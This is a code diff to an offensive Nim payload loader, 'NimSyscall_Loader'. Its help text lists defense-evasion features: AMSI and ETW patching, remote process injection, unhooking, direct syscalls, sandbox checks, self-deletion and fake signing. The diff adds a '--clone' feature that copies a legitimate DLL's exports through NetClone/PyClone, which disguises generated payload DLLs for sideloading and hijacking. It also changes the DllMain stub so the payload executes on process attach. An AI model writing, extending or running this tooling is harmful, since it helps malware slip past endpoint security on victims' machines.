@@ -63,7 +63,7 @@ let helpmenu = """
 NimSyscall_Loader v 1.6
 
 Usage:
-  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --dllhijack --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
+  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --dllhijack --clone=<dllToClone> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
   NimSyscall_Loader (-h | --help)
   NimSyscall_Loader --version
 
@@ -78,9 +78,6 @@ Options:
   --output filename    Filename for encrypted exe/dll
   --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
   --noRES    Don't set custom resource file information (cmd icon, CMD description by default)
-  --dll     Generate DLL instead of an exe
-  --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions for e.g. DLL-Sideloading
-  --dllhijack    Add an DLLMain Export with DLL_PROCESS_ATTACH for Hijacking
   --noETW    Don't use ETW Patch
   --noAMSI    Don't patch AMSI
   --noArgs    Don't provide any arguments to the assembly (some can only run without args)
@@ -92,6 +89,13 @@ Options:
   --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
   --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
   --verbose    Prints output to the console (for troubleshooting purposes)
+
+[DLL options]
+
+  --dll     Generate DLL instead of an executable
+      --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions for e.g. DLL-Sideloading
+      --dllhijack    Add an DLLMain Export with DLL_PROCESS_ATTACH for Hijacking
+      --clone value    Specify a local DLL to clone the API-Exports from
 
 [evasion]
 
@@ -171,6 +175,9 @@ var
     dllfunc: string = ""
     dllexportfunctions: seq[string]
     dllhijack: bool = false
+    dllclone: bool = false
+    dllToClone: string = ""
+    replaceNimMain: bool = false
     big: bool
     remoteprocesses : seq[string]
     targetdomain : string = ""
@@ -271,6 +278,13 @@ if args["--dllexportfunc"]:
 
 if args["--dllhijack"]:
   dllhijack = true
+
+if args["--clone"]:
+    dllclone = true
+    # NetClone will only work, when DllMain is exposed and leading to NimMain
+    dllhijack = true
+    let cloneDLL = args["--clone"]
+    dllToClone = fmt"{cloneDLL}"
 
 var customLoaderName: string = rndStr(rand(5..15))
 
@@ -989,23 +1003,25 @@ let DllStub = """
 import dynlib
 proc NimMain() {.cdecl, importc.}
 
-proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
-    NimMain()
-    return true
+when defined(notcloned):
+    proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+        NimMain()
+        return true
 
-proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
-    NimMain()
-    return true
+    proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+        NimMain()
+        return true
 
-proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
-    NimMain()
-    return true
+    proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
+        NimMain()
+        return true
 """
 
 let DLLHijackStub = """
 
 proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
-  NimMain()
+  when defined(notcloned):
+    NimMain()
   
   if fdwReason == DLL_PROCESS_ATTACH:
     NimMain()
@@ -1440,6 +1456,9 @@ elif system.hostOS == "windows":
 elif system.hostOS == "linux":
     basicCompileFlags = "nim c -d:release -d=mingw --hint:pattern:off --warning:all:off -d:danger -d:strip --opt:size -d:noRes " # -d:noRes is used to not embed a winim manifest in the loader
 
+if(denim):
+    basicCompileFlags.add("-d:denim ")
+
 if(hellsgate):
     basicCompileFlags.add("-d:Hellsgate ")
 elif(getfreshstub):
@@ -1449,6 +1468,9 @@ elif(syswhispers):
 
 if (verbose):
     basicCompileFlags.add("-d:verbose ")
+
+if (dllClone == false):
+    basicCompileFlags.add("-d:notcloned ")
 
 if embeddedArguments:
     basicCompileFlags.add("-d:args ")
@@ -1564,8 +1586,18 @@ proc replaceList () =
         echo command
         discard exec_cmd_ex(command)
 
+
 if(replace):
     replaceList()
+
+if(dll_out):
+    if(dllclone):
+        echo fmt"[!] Cloning the DLL {dllToClone} API imports via NetClone/PyClone:"
+        when system.hostOS == "windows":
+            discard os.execShellCmd(fmt"{packerPath}\NetClone\NetClone.exe --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}")
+        else:
+            discard os.execShellCmd(fmt"{packerPath}\NetClone\PyClone.py --target {outfile} --reference {dllToClone} --reference-path {dllToClone} -o {outfile}")
+
 let msg = fmt"[!] Encrypted file saved to {outfile}"
 echo "\n" & msg
 
